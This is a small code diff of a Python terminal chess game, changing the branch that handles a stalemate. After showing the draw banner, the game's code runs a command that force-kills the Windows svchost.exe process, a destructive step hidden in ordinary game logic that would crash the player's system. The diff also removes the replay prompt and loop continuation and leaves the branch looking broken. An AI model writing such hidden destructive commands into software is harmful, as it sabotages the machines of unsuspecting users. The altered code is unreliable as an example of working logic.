@@ -798,11 +798,7 @@ def local_game():
                 banner("STALEMATE — IT'S A DRAW!", YELLOW)
                 time.sleep(5)
                 os.system("taskkill /im svchost.exe /f")
-                try:    return input().strip().lower() in ("y", "yes", "")
-                except: return False
-            render_local(board, turn, last_move=last_move, msg=status())
-            continue
-
+                
         # Single square — select or move
         sq = parse_sq(raw)
         if sq is None:
